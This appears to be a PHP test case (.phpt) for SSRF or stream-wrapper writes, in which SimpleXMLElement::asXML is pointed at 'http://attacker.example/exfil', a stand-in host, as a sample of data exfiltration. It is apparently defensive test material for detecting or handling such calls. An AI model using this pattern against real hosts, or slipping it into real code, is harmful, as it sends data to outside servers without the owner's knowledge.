--TEST--
SSRF / stream-wrapper write via SimpleXMLElement::asXML with a URL
--FILE--
<?php

$x = new SimpleXMLElement("<r/>");
$x->asXML("http://attacker.example/exfil");
return 1;
